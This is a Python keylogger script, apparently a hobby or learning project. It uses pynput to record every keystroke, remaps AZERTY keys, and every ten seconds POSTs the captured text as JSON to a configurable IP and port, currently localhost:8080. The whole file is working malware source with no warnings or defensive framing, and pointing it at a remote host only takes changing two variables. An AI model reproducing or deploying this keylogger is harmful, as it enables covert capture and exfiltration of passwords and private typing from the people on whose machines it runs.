from pynput import keyboard
import requests
import json
import threading

text = ""
ipAddress = "127.0.0.1"
portNumber = "8080"
timeInterval = 10

azerty_mapping = {
    "a": "q",
    "q": "a",
    "z": "w",
    "w": "z",
    "m": ",",
    ",": "m",
    "A": "Q",
    "Q": "A",
    "Z": "W",
    "W": "Z",
    "M": "?",
    "?": "M",
    "4": "'",
    "/": "!",
}


def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        requests.post(
            f"http://{ipAddress}:{portNumber}",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        timer = threading.Timer(timeInterval, send_post_req)
        timer.start()
    except:
        print("Impossible de compléter la requête !")


def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        char = str(key).strip("'")
        if char in azerty_mapping:
            char = azerty_mapping[char]
        text += char


with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
